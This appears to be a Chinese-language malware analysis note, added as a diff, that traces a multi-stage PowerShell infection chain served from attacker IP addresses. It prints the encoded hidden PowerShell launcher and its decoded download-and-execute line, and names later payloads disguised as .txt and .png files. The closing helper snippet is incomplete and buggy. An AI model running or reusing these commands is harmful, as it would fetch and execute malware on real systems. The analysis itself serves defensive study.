@@ -1,0 +1,56 @@
+打开【http://185.128.43.62/antivirus.php】得到【1_1_antivirus.php】
+
+
+从【1_1_antivirus.php】中得到如下命令
+cmd.exe /c powershell.exe -nop -noni -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADEAMgA4AC4ANAAzAC4ANgAyADoANAA0ADMALwBhAG4AdABpAHYAaQByAHUAcwAuAHAAcwAxACcAKQApAAoA
+
+
+Base64解密字符串，得到如下数据
+IEX ((new-object net.webclient).downloadstring('http://185.128.43.62:443/antivirus.ps1'))
+
+
+打开【http://185.128.43.62:443/antivirus.ps1】得到【1_2_antivirus.ps1】
+
+
+修改【1_2_antivirus.ps1】得到【1_2_antivirus.ps1.modify.ps1】
+
+
+执行【1_2_antivirus.ps1.modify.ps1】得到【antivirus_content.ps1】（即【1_3_1_antivirus_content.ps1】）和【fffffff_content.ps1】（即【1_3_0_0_fffffff_content.ps1】）和一些【bin】文件。
+
+
+处理【1_3_0_0_fffffff_content.ps1】最后得到【1_3_0_3_fffffff_content.ps1.total.ps1】文件。
+
+
+修改【1_3_1_antivirus_content.ps1】得到【1_3_1_antivirus_content.ps1.modify.ps1】文件。
+
+
+合并【1_3_0_3_fffffff_content.ps1.total.ps1】和【1_3_1_antivirus_content.ps1.modify.ps1】得到【1_3_2_antivirus_content.ps1.total.ps1】
+
+
+
+
+
+文件【1_3_antivirus_content.ps1】在编写的时候故意降低了可读性。
+经过阅读，可知，在32-bit时，会执行【http://185.128.43.62:443/antitrojan.ps1】即【1_4_antitrojan.ps1】文件。
+
+
+
+
+
+打开【http://185.128.40.102/antivirus.ps1】得到【185.128.40.102_antivirus.ps1】
+
+
+
+
+
+打开【http://185.128.43.62:443/cohernece.txt】得到【cohernece.txt】，它其实是【cohernece.exe】。
+
+打开【http://185.128.43.62:443/logos.png】得到【logos.png】，它是【java-log-9527.log】，
+
+
+
+$FilePath = 
+[string]$hexformat=(Get-Content $FilePath)
+
+$OutPath = "logos.png.bin"
+[System.IO.File]::WriteAllBytes("OutPath", $temp)
